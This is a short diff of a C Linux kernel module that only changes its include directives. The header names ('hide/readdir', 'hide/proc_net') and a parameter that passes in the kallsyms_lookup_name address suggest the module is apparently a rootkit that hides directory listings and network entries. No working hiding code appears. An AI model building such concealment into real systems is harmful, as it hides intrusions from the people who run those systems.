@@ -6,11 +6,10 @@
 #include <linux/printk.h>
 #include <linux/errno.h>
 
-#include "license.h"
-#include "ksyms.h"
-#include "config.h"
-#include "hide/readdir.h"
-#include "hide/proc_net.h"
+#include <license.h>
+#include <ksyms.h>
+#include <config.h>
+#include <hide.h>
 
 static unsigned long kallsyms_lookup_name_addr;
 module_param_named(kallsyms_lookup_name, kallsyms_lookup_name_addr, ulong, 0);
